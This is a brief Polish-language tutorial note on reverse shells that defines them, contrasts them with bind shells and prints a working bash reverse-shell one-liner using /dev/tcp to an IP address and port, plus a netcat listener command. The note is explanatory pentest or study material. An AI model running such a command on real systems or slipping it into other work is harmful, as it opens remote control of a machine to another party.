## Reverse shell:

Reverse shell to mechanizm komunikacji, w którym:
- zdalna maszyna inicjuje połączenie do innej maszyny
- połączenie wychodzi „na zewnątrz”, więc łatwiej przechodzi przez firewalle
- po zestawieniu połączenia można wykonywać polecenia jak w normalnej powłoce

### Różnica:

bind shell — Ty łączysz się do zdalnej maszyny
reverse shell — zdalna maszyna łączy się do Ciebie

### Reverse shell w bash:

Przykład polecenia wysyłającego:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.168.234/8080 0>&1'
```
Odbieranie połączenia lokalnie:

```bash
nc -lvnp 8080
```
